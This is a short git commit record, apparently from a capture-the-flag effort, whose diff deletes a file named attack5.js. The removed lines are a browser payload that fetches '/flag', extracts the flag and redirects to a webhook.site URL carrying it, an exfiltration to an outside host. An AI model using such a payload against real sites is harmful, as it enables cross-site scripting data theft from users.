aae897bfb14dd3a3b53ed78edf611a1faa245e4a
Emyr298 <emi.ru298@gmail.com>
2023-12-03 10:05:06 +0700

    s

--- attack5.js
+++
@@ -1,5 +0,0 @@
-fetch('/flag').then((res) => {
-    res.text().then((test) => {
-        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${test.match(/NCW23{.+?}/)[0]}`;
-    })
-})
